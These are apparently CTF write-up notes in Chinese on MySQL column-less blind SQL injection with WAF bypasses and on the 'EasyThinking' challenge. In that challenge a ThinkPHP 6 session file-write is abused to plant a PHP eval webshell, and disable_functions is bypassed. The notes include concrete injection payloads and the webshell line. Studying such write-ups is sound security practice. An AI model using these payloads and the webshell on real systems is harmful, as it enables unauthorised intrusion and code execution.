FIND_IN_SET(str,strlist)
假如字符串str 在由N 子链组成的字符串列表strlist 中，则返回值的范围在 1 到 N 之间。
一个字符串列表就是一个由一些被‘,’符号分开的自链组成的字符串 比如’a,b,c’

smile师傅的出题笔记

用sys.schema_table_statistics_with_buffer库注出表名

无列名注入过滤了join，union select 又不能同时用，如果是一列的话可以直接substr截取字符，可是经过测试这是两列
新姿势select((select ‘1’,’g’)>(select * from f1ag_1s_h3r3_hhhhh)
这里只能用大于号，小于号会出错不知道为什么233

这个payload有个缺点，就是不区分大小写，但是跑出来的字符是没问题的，因为平台flag都是小写，这个点直接绕过了
字符串转为二进制后会强制进行字节对字节的比较，也就能区分大小写了，BINARY函数可以把字符串转为二进制
select 1,BINARY(‘aA’)
但是BINARY含有in被waf了，博客
MySQL中的JSON对象是二进制对象，因此，CAST(0 AS JSON)会返回一个二进制字符串
SELECT CONCAT(“A”, CAST(0 AS JSON))也会返回一个二进制字符串
因为buu的环境没有json对象，我本地的mysql也没有233 这里就记录一下smile师傅的pyaload

day3

EasyThinking

题目界面如下

www.zip下载源码，观察url /home/member/index 找到控制器源码位置在\web\app\home\controller\Member.php

很容易想到这个题和前段时间爆出的tk6任意文件操作有关，smile师傅的分析
data key是可控的，就可以任意写入文件，值是搜索的值，被序列化写入session

先注册一个账号，然后修改cookie PHPSESSID的值为aaaaaaaaaaaaaaaaaaaaaaaaaaab.php(32位)，再用刚注册的账号登陆
带着cookie去登陆之后，session文件就会被修改为sess_aaaaaaaaaaaaaaaaaaaaaaaaaaab.php
因为在获取session的时候 如果值是32位就会直接返回

然后搜索key=<?php @eval($_POST[‘cop’]);?>，就写入shell了，shell位置在 /runtime/session/sess_PHPSESSID值
phpinfo发现过滤了好多函数 常规的利用环境变量LD_PRELOAD绕过：mail,imap_mail,error_log,mb_send_mail 全给禁用了
然后php版本是7.3，对于php7有个bug可以bypass disable_functions exp在git上
上传exp之后执行命令./readflag就ok了
附bypass disable_functions的几篇文章
https://mp.weixin.qq.com/s/VR8byhVnebgSEspwtPhhRg
https://mp.weixin.qq.com/s/JCnr0F-RN_U0mdNwmVYRdQ
在安全客的这篇文章中，fuzz出了除mail,imap_mail,error_log,mb_send_mail外调用系统进程的函数gnupg_init();
在比赛的php环境里安装了gnupg扩展可以用这个函数，但是执行命令没用成功，不知道哪出错了233

题目界面
